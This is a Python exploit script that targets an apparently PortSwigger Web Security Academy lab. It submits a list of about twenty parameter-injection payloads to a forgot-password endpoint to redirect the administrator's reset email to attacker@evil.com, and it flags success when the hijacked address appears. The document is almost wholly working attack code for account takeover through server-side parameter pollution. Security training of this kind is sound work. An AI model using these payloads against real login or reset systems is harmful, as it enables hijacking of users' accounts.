#!/usr/bin/env python3
import requests
import sys
import json
import re

def get_csrf_token(session, lab_url):
    """Get CSRF token from forgot-password page"""
    resp = session.get(f"{lab_url}/forgot-password")
    csrf_match = re.search(r'name="csrf"\s+value="([^"]+)"', resp.text)
    if csrf_match:
        return csrf_match.group(1)
    return None

def exploit_query_param_injection(lab_url):
    """Try injecting query parameters into the username field"""

    session = requests.Session()
    session.get(f"{lab_url}/login")

    csrf = get_csrf_token(session, lab_url)
    print(f"Session: {session.cookies.get('session')}")
    print(f"CSRF: {csrf}")

    reset_url = f"{lab_url}/forgot-password"

    # Malformed Content-Type
    headers = {
        "Content-Type": "x-www-form-urlencoded",  # MALFORMED!
        "Accept": "*/*",
        "Origin": lab_url,
        "Referer": f"{lab_url}/forgot-password"
    }

    print("\n[*] Testing query parameter injection...")

    # The backend might be making a request like:
    # /api/reset?username=VALUE
    # We can try to inject additional query parameters

    payloads = [
        # Query parameter injection using ?
        f"csrf={csrf}&username=administrator?email=attacker@evil.com",
        f"csrf={csrf}&username=administrator?result=attacker@evil.com",
        f"csrf={csrf}&username=administrator?to=attacker@evil.com",

        # Using & to add parameters (URL encoded)
        f"csrf={csrf}&username=administrator%26email=attacker@evil.com",
        f"csrf={csrf}&username=administrator%26result=attacker@evil.com",
        f"csrf={csrf}&username=administrator%26to=attacker@evil.com",

        # Using & without encoding
        f"csrf={csrf}&username=administrator&email=attacker@evil.com",
        f"csrf={csrf}&username=administrator&result=attacker@evil.com",
        f"csrf={csrf}&username=administrator&to=attacker@evil.com",

        # Try different parameter names
        f"csrf={csrf}&username=administrator?recipient=attacker@evil.com",
        f"csrf={csrf}&username=administrator?dest=attacker@evil.com",
        f"csrf={csrf}&username=administrator?target=attacker@evil.com",
        f"csrf={csrf}&username=administrator?sendTo=attacker@evil.com",
        f"csrf={csrf}&username=administrator?mail=attacker@evil.com",

        # Try overriding with fragment
        f"csrf={csrf}&username=administrator#email=attacker@evil.com",
        f"csrf={csrf}&username=administrator#result=attacker@evil.com",

        # Mixed encoding
        f"csrf={csrf}&username=administrator%3Femail=attacker@evil.com",
        f"csrf={csrf}&username=administrator%3Fresult=attacker@evil.com",

        # Try path traversal style
        f"csrf={csrf}&username=administrator/../email/attacker@evil.com",
        f"csrf={csrf}&username=administrator/..?email=attacker@evil.com",
    ]

    for i, payload in enumerate(payloads, 1):
        print(f"\n[Test {i}]")
        print(f"Payload: {payload[:100]}...")

        try:
            response = session.post(
                reset_url,
                data=payload,
                headers=headers,
                allow_redirects=False
            )

            print(f"Status: {response.status_code}")

            if response.status_code == 200:
                try:
                    result = response.json()
                    print(f"Response: {result}")

                    if "result" in result:
                        email = result["result"]
                        if "attacker" in email or "evil" in email:
                            print(f"\n[!!!] SUCCESS! Email hijacked to: {email}")
                            print(f"[!!!] Working payload: {payload}")
                            return True
                        elif "*****" not in email and "@" in email:
                            print(f"[!] Email revealed/changed: {email}")

                except json.JSONDecodeError:
                    print(f"Non-JSON: {response.text[:100]}")

            elif response.status_code == 500:
                print("[!] Server error - might be processing differently")

            elif response.status_code == 400:
                print("[!] Bad request")

        except Exception as e:
            print(f"Error: {e}")

    return False

if __name__ == "__main__":
    lab_url = "https://0aa1009a0379161a82cd10b40031005f.web-security-academy.net"

    if len(sys.argv) > 1:
        lab_url = sys.argv[1].rstrip('/')

    print(f"Exploiting query parameter injection at: {lab_url}")
    exploit_query_param_injection(lab_url)